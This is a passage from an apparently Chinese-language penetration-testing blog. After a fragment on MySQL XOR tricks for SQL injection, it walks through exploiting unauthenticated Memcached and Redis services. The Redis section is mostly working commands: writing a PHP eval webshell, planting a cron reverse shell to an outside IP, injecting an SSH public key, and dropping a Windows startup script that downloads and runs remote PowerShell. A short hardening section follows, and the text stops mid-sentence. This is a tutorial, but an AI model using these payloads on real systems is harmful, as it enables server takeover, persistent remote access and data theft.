class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span class="line">+----------+</span><br><span class="line">|     5644 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>其他数字a与任意数字b异或得到c</p><p>可以通过c与a异或得到b，通常b是我们sql注入想要的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (10^5644);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5644) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5638 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (10^5638);</span><br><span class="line">+-----------+</span><br><span class="line">| (10^5638) |</span><br><span class="line">+-----------+</span><br><span class="line">|      5644 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h5><p>1、mysql的网站注入，5.0以上和5.0以下有什么区别？</p><p>MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p><p> 5.0以下是多用户单操作，5.0以上是多用户多操做。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> OWASP-TOP10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWSP-TOP10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试--常见未授权访问漏洞</title>
      <link href="2020/06/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81/"/>
      <url>2020/06/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81/</url>
      
        <content type="html"><![CDATA[<h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><h3 id="11211端口–memcache"><a href="#11211端口–memcache" class="headerlink" title="11211端口–memcache"></a>11211端口–memcache</h3><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>Memcached 是一套常用的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公网开放的 Memcache 服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="telnet直接连接目标端口"><a href="#telnet直接连接目标端口" class="headerlink" title="telnet直接连接目标端口"></a>telnet直接连接目标端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet xx.xx.xx.xx 11211</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ telnet ip 11211</span><br><span class="line">Trying ip...</span><br><span class="line">Connected to ip.</span><br><span class="line">Escape character is &#39;^]&#39;.</span><br></pre></td></tr></table></figure><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  -p 端口 --script memcached-info IP</span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-11-16 17:56 CST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> ip</span><br><span class="line">Host is up (<span class="number">0.54</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE   VERSION</span><br><span class="line"><span class="number">11211</span>/tcp open  memcached Memcached <span class="number">1.4</span><span class="number">.13</span> (uptime <span class="number">27164261</span> seconds)</span><br><span class="line">| memcached-info:</span><br><span class="line">|   Process ID: <span class="number">1121</span></span><br><span class="line">|   Uptime: <span class="number">27164262</span> seconds</span><br><span class="line">|   Server time: <span class="number">2020</span><span class="number">-11</span><span class="number">-16</span>T09:<span class="number">43</span>:<span class="number">25</span></span><br><span class="line">|   Architecture: <span class="number">64</span> bit</span><br><span class="line">|   Used CPU (user): <span class="number">1792.059996</span></span><br><span class="line">|   Used CPU (system): <span class="number">2583.961487</span></span><br><span class="line">|   Current connections: <span class="number">7</span></span><br><span class="line">|   Total connections: <span class="number">8070135</span></span><br><span class="line">|   Maximum connections: <span class="number">1024</span></span><br><span class="line">|   TCP Port: <span class="number">11211</span></span><br><span class="line">|   UDP Port: <span class="number">0</span></span><br><span class="line">|_  Authentication: no</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">15.20</span> seconds</span><br></pre></td></tr></table></figure><h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats &#x2F;&#x2F;查看memcache 服务状态 </span><br><span class="line">stats items &#x2F;&#x2F;查看所有items </span><br><span class="line">stats cachedump 32 0 &#x2F;&#x2F;获得缓存key </span><br><span class="line">get :state:264861539228401373:261588 &#x2F;&#x2F;通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure><h3 id="6379端口–Redis"><a href="#6379端口–Redis" class="headerlink" title="6379端口–Redis"></a>6379端口–Redis</h3><h4 id="Redis简介及搭建实验环境"><a href="#Redis简介及搭建实验环境" class="headerlink" title="Redis简介及搭建实验环境"></a>Redis简介及搭建实验环境</h4><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。它通常被称为数据结构服务器，因为值（value）可以是字符串(String), 哈希(Map), 列表(list), 集合(sets) 和有序集合(sorted sets)等类型。</p><h4 id="Redis默认端口"><a href="#Redis默认端口" class="headerlink" title="Redis默认端口"></a>Redis默认端口</h4><p>Redis默认配置端口为6379，sentinel.conf配置器端口为26379</p><p>默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p><h4 id="连接Redis服务器"><a href="#连接Redis服务器" class="headerlink" title="连接Redis服务器"></a>连接Redis服务器</h4><p>（1）交互式方式</p><p>redis-cli -h {host} -p {port}方式连接，然后所有的操作都是在交互的方式实现，不需要再执行redis-cli了，例如命令：redis-cli -h 127.0.0.1-p 6379，加-a参数表示带密码的访问。</p><p>（2）命令方式<br>redis-cli -h {host} -p {port} {command}直接得到命令的返回结果.</p><h4 id="Redis特点"><a href="#Redis特点" class="headerlink" title="Redis特点"></a>Redis特点</h4><ul><li>随时执行“save”命令将当前redis的数据保存到硬盘上，另外redis也会根据配置自动存储数据到硬盘上。</li><li>dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</li><li>dbfilename RDB文件名，默认为“dump.rdb”</li><li>appendonly 是否开启AOF</li></ul><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F; 指定本地数据库存放目录</span><br><span class="line">config set dbfilename authorized_keys 指定本地数据库文件名，默认值为 dump.rdb</span><br></pre></td></tr></table></figure><p>（1）查看信息：info<br>（2）删除所有数据库内容：flushall<br>（3）刷新数据库：flushdb<br>（4）看所有键：KEYS *，使用select num可以查看键值数据。<br>（5）设置变量：set test “who am i”<br>（6）config set dir dirpath 设置路径等配置<br>（7）config get dir/dbfilename 获取路径及数据配置信息<br>（8）save保存<br>（9）get 变量，查看变量名称</p><h4 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h4><p>bind 127.0.0.1前面加上#号 </p><p>protected-mode设为no</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902091712669.png" alt="image-20200902091712669"></p><p>默认的配置是使用6379端口，没有密码。</p><p>查看是否开放成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ netstat -ant | grep 6379</span><br><span class="line">tcp4       0      0  127.0.0.1.6379         *.*                    LISTEN</span><br></pre></td></tr></table></figure><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h5><h6 id="redis未授权访问漏洞利用与防御"><a href="#redis未授权访问漏洞利用与防御" class="headerlink" title="redis未授权访问漏洞利用与防御"></a>redis未授权访问漏洞利用与防御</h6><ul><li><h5 id="ssh-登录–公钥登录"><a href="#ssh-登录–公钥登录" class="headerlink" title="ssh 登录–公钥登录"></a>ssh 登录–公钥登录</h5><p>公钥登就是需要公钥文件，用户把公钥上传在远程服务器上，用户登录之后服务器发送一串随机数字给客户端，客户端使用私钥进行加密然后发送给服务端，服务端使用公钥进行解密。</p><p>使用ssh-keygen生成公钥，在生成的过程中对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><p>运行结束以后，在 $HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub 和 id_rsa。前者是你的公钥，后者是你的私钥。</p><p>通常这时再输入下面的命令，将公钥传送到远程主机 host 上面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-copy-id user@host</span><br></pre></td></tr></table></figure><p>authorized_keys 文件，远程主机将用户的公钥，保存在登录后的用户主目录的$HOME/.ssh/authorized_keys 文件中。公钥就是一段字符串，只要把它追加在 authorized_keys 文件的末尾就行了。</p></li><li><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下(Redis 的默认配置)，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p><ul><li><h5 id="ssh-keygen公钥然后使用私钥登陆"><a href="#ssh-keygen公钥然后使用私钥登陆" class="headerlink" title="ssh-keygen公钥然后使用私钥登陆"></a>ssh-keygen公钥然后使用私钥登陆</h5><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol></li><li><h5 id="往web物理路径写webshell"><a href="#往web物理路径写webshell" class="headerlink" title="往web物理路径写webshell"></a>往web物理路径写webshell</h5><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p><p>写入shell</p><p>前提：</p><p>1、开启web服务</p><p>2、对web服务有写入权限</p><p>3、知道web目录</p><p>kali开启redis服务</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902194350551.png" alt="image-20200902194350551"></p><p>mac尝试连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;redis&#x2F;bin&#x2F;redis-cli -h 192.168.195.130</span><br></pre></td></tr></table></figure><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; info</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902194545161.png" alt="image-20200902194545161"></p><p>尝试写shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename redis.php</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; set webshell &quot;&lt;?php @eval($_POST[123]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>在写shell的时候我们可以加上换行符，避免出现一下情况(\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200902195916508.png" alt="image-20200902195916508"></p><p>redis在生产环境里面数据量经常是十分庞大的，save到php文件里会超过php的允许文件大小，导致无法解析，我们可以先备份全部数据，然后在直接flushall全删掉。</p></li><li><p>计时任务反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br></pre></td></tr></table></figure><p>这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。比如tom建的crontab任务对应的文件就是/var/spool/cron/tom，一般一个用户最多只有一个crontab文件。</p><p>攻击机监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lnvp 6666</span><br></pre></td></tr></table></figure><p>连接靶机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ &#x2F;Applications&#x2F;MxSrvs&#x2F;bin&#x2F;redis&#x2F;bin&#x2F;redis-cli -h 192.168.195.130</span><br><span class="line">192.168.195.130:6379&gt; set x &quot;\n* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;164.155.95.55&#x2F;6666 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt;</span><br></pre></td></tr></table></figure></li><li><p>公钥登录</p><p>前提：</p><ol><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ol><p>kali生成一对密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~# ssh-keygen -t rsa</span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.</span><br><span class="line">Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:&#x2F;29LS6&#x2F;F9OXUPX8naWC+1A2HomVSr3hjDVkR2vyUOtI root@steady</span><br><span class="line">The key&#39;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|              o. |</span><br><span class="line">|             + ..|</span><br><span class="line">|            o +..|</span><br><span class="line">|           ..+.+o|</span><br><span class="line">|        S ..OE+.O|</span><br><span class="line">|         . O.B.X&#x3D;|</span><br><span class="line">|          + B O X|</span><br><span class="line">|           &#x3D; *.&#x3D;o|</span><br><span class="line">|            oo&#x3D;o.|</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@steady:~# </span><br></pre></td></tr></table></figure><p>kali查看公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@steady:~&#x2F;.ssh# cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYvK62OIoY1PHjAGXb4EzPeqI2JIp8b2IsX1YvGTH4o&#x2F;V&#x2F;KP75HMwGWWQwdZudb3taAKfyPlfoKszLm5a0Yj2WCz3m8qOIKsXIrMel9ik&#x2F;933ZOQmSVQWOh3Q26uBFteRFRg4dJ1t4uIE94hQhc4Hene7ypDfeKDTnRrZQNx0h4fB5l5bbrPBH7ATcj3H4159+OPTMkZ9u+bQK+Uo2yWwFfwKdsvLTLtGQJ9s+zIwes8dC+UdIjtVphVKj9fNABnYVpkfc42yAPpDLCaM3lbIHKeshsSllz7CctU9YmGwwpAfLiW6ojt7Ffqe5wrPJIMjbUdB95XQCtr3z4XHv&#x2F;TEwJlW4n7miwi3OUbLKrQNwAUNjPEKKmGzwsS+kR85Z6FqjghLiLc8A19j28JtAfmISM&#x2F;xZ&#x2F;SIRoeR+N801sup+jOMo7HbpbJK2SRJ8NSHoGzK5uXa7JrqtOZyBmYqAeNNiysDt9uRHwE0Kqmf0&#x2F;Q8oRe2hJ3eKqwHsTNkIFwG1nDs&#x3D; root@steady</span><br></pre></td></tr></table></figure><p>公钥上传到受害机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.195.130:6379&gt; config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; set x &quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCYvK62OIoY1PHjAGXb4EzPeqI2JIp8b2IsX1YvGTH4o&#x2F;V&#x2F;KP75HMwGWWQwdZudb3taAKfyPlfoKszLm5a0Yj2WCz3m8qOIKsXIrMel9ik&#x2F;933ZOQmSVQWOh3Q26uBFteRFRg4dJ1t4uIE94hQhc4Hene7ypDfeKDTnRrZQNx0h4fB5l5bbrPBH7ATcj3H4159+OPTMkZ9u+bQK+Uo2yWwFfwKdsvLTLtGQJ9s+zIwes8dC+UdIjtVphVKj9fNABnYVpkfc42yAPpDLCaM3lbIHKeshsSllz7CctU9YmGwwpAfLiW6ojt7Ffqe5wrPJIMjbUdB95XQCtr3z4XHv&#x2F;TEwJlW4n7miwi3OUbLKrQNwAUNjPEKKmGzwsS+kR85Z6FqjghLiLc8A19j28JtAfmISM&#x2F;xZ&#x2F;SIRoeR+N801sup+jOMo7HbpbJK2SRJ8NSHoGzK5uXa7JrqtOZyBmYqAeNNiysDt9uRHwE0Kqmf0&#x2F;Q8oRe2hJ3eKqwHsTNkIFwG1nDs&#x3D; root@steady\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.195.130:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>使用攻击机并带上私钥登录目标服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh -i  &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;id_rsa  root@192.168.195.130</span><br><span class="line">Linux steady 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">root@steady:~#</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>利用 Redis 写入 bat 文件到启动项(windows)</p><p>启动项：</p><p>启动项目，就是开机的时候系统会在前台或者后台运行的程序。许多程序的自启动，给我们带来了很多方便。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xxx.xxx.xxx.1:6379&gt; config set dir &quot;C:&#x2F;Users&#x2F;Administrator&#x2F;AppData&#x2F;Roaming&#x2F;Microsoft&#x2F;Windows&#x2F;Start Menu&#x2F;Programs&#x2F;startup&#x2F;&quot;</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; config set dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; set x &quot;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.2&#x2F;shell.ps1&#39;);xx.ps1\&quot;\r\n\r\n&quot;</span><br><span class="line">OK</span><br><span class="line">xxx.xxx.xxx.1:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>使用msf或者cs进行监听，ps会反弹一个shell。</p></li></ul><ul><li><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul><li><p>修改 redis.conf 文件</p><p>添加密码认证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加 requirepass mypassword</span><br></pre></td></tr></table></figure><p>禁止外网访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加 bind 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p>阻止其他用户添加新的公钥</p><p>将 <code>authorized_keys</code> 的权限设置为对拥有者只读，其他用户没有任何权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><p>保证 <code>authorized_keys</code> 的权限不会被改掉，需要设置该文件的 immutable 位权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chattr +i ~&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure></li><li><p>用户还可以重命名 <code>~/.ssh</code>，然后新建新的 <code>~/.ssh</code> 目录和 <code>authorized_keys</code> 文件。要避免这种情况，需要设置 <code>~./ssh</code> 的 immutable 位权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chattr +i ~&#x2F;.ssh</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="redis主从复制漏洞"><a href="#redis主从复制漏洞" class="headerlink" title="redis主从复制漏洞"></a>redis主从复制漏洞</h6><p>主从复制</p><p>主从模式就是一个redis实例作为主机，其他实例作为备份机，但是主机和备份机数据相同，主机器负责写，从机器只负责读。通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>Redis模块</p><p>在Reids 